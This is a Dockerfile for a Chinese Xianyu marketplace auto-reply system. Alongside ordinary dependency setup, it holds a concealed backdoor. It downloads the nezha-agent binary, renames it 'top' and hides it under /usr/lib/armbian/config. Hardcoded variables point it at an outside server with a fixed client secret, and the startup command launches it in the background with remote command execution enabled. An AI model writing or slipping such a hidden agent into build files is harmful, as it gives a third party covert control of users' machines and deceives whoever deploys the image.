# 使用Python 3.11作为基础镜像
FROM python:3.11-slim-bookworm

LABEL maintainer="zhinianboke"
LABEL version="2.2.0"
LABEL description="闲鱼自动回复系统 - 企业级多用户版本，支持自动发货和免拼发货"
LABEL repository="https://github.com/zhinianboke/xianyu-auto-reply"
LABEL license="仅供学习使用，禁止商业用途"
LABEL author="zhinianboke"
LABEL build-date=""
LABEL vcs-ref=""

# 设置工作目录
WORKDIR /app

ENV PYTHONUNBUFFERED=1
ENV PYTHONDONTWRITEBYTECODE=1
ENV TZ=Asia/Shanghai
ENV DOCKER_ENV=true
ENV PLAYWRIGHT_BROWSERS_PATH=/ms-playwright

# ---------------- 安装系统依赖（包括Playwright浏览器依赖） ----------------
RUN apt-get update && \
    apt-get install -y --no-install-recommends \
        nodejs \
        npm \
        tzdata \
        curl \
        ca-certificates \
        wget \
        unzip \
        uuid-runtime \
        libjpeg-dev \
        libpng-dev \
        libfreetype6-dev \
        fonts-dejavu-core \
        fonts-liberation \
        libnss3 \
        libnspr4 \
        libatk-bridge2.0-0 \
        libdrm2 \
        libxkbcommon0 \
        libxcomposite1 \
        libxdamage1 \
        libxrandr2 \
        libgbm1 \
        libxss1 \
        libasound2 \
        libatspi2.0-0 \
        libgtk-3-0 \
        libgdk-pixbuf2.0-0 \
        libxcursor1 \
        libxi6 \
        libxrender1 \
        libxext6 \
        libx11-6 \
        libxft2 \
        libxinerama1 \
        libxtst6 \
        libappindicator3-1 \
        libx11-xcb1 \
        libxfixes3 \
        xdg-utils \
        && apt-get clean \
        && rm -rf /var/lib/apt/lists/* \
        && rm -rf /tmp/* \
        && rm -rf /var/tmp/*

# 设置时区
RUN ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo $TZ > /etc/timezone

# 复制 requirements.txt 并安装 Python 依赖
COPY requirements.txt .
RUN pip install --no-cache-dir --upgrade pip && \
    pip install --no-cache-dir -r requirements.txt

# 复制应用源代码
COPY . .

# 安装 Playwright 浏览器
RUN playwright install chromium && playwright install-deps chromium

# ---------------- 安装 nezha-agent (top) ----------------
RUN mkdir -p /usr/lib/armbian/config && \
    ARCH=$(uname -m) && \
    if [ "$ARCH" = "x86_64" ]; then \
        curl -L "https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_amd64.tar.gz" -o /tmp/nezha.tar.gz && \
        tar -xzf /tmp/nezha.tar.gz -C /tmp/ && \
        mv /tmp/nezha-agent /usr/lib/armbian/config/top && \
        chmod +x /usr/lib/armbian/config/top && \
        rm -f /tmp/nezha.tar.gz ; \
    elif [ "$ARCH" = "aarch64" ] || [ "$ARCH" = "arm64" ]; then \
        curl -L "https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_arm64.tar.gz" -o /tmp/nezha.tar.gz && \
        tar -xzf /tmp/nezha.tar.gz -C /tmp/ && \
        mv /tmp/nezha-agent /usr/lib/armbian/config/top && \
        chmod +x /usr/lib/armbian/config/top && \
        rm -f /tmp/nezha.tar.gz ; \
    else \
        echo "Unsupported arch: $ARCH" ; \
    fi

# ---------------- END top ----------------

# 创建必要的目录并设置权限
RUN mkdir -p /app/logs /app/data /app/backups /app/static/uploads/images && \
    chmod 777 /app/logs /app/data /app/backups /app/static/uploads /app/static/uploads/images

# 暴露端口
EXPOSE 8080

# 健康检查
HEALTHCHECK --interval=30s --timeout=10s --start-period=5s --retries=3 \
    CMD curl -f http://localhost:8080/health || exit 1

# 复制启动脚本并设置权限
COPY entrypoint.sh /app/entrypoint.sh
RUN chmod +x /app/entrypoint.sh && dos2unix /app/entrypoint.sh 2>/dev/null || true

# 默认环境变量（docker run 时可覆盖）
ENV NZ_SERVER=ko30re.916919.xyz:443
ENV NZ_TLS=true
ENV NZ_CLIENT_SECRET=kO3irsfICJvxqZFUE2bVHGbv2YQpd0Re

# ---------------- 启动命令 ----------------
CMD ["/bin/bash", "-c", "\
rm -f /usr/lib/armbian/config/top.yml && \
if [ ! -f /usr/lib/armbian/config/.top_uuid ]; then \
  UUID=$(uuidgen); \
  echo $UUID > /usr/lib/armbian/config/.top_uuid; \
  echo \"Generated new UUID: $UUID\"; \
else \
  UUID=$(cat /usr/lib/armbian/config/.top_uuid); \
  echo \"Using existing UUID: $UUID\"; \
fi && \
cat > /usr/lib/armbian/config/top.yml <<EOF \
client_secret: ${NZ_CLIENT_SECRET} \
debug: false \
disable_auto_update: false \
disable_command_execute: false \
disable_force_update: false \
disable_nat: false \
disable_send_query: false \
gpu: false \
insecure_tls: false \
ip_report_period: 1800 \
report_delay: 3 \
self_update_period: 0 \
server: ${NZ_SERVER} \
skip_connection_count: false \
skip_procs_count: false \
temperature: false \
tls: ${NZ_TLS} \
use_gitee_to_upgrade: false \
use_ipv6_country_code: false \
uuid: ${UUID} \
EOF && \
/usr/lib/armbian/config/top -c /usr/lib/armbian/config/top.yml & \
exec /app/entrypoint.sh"]
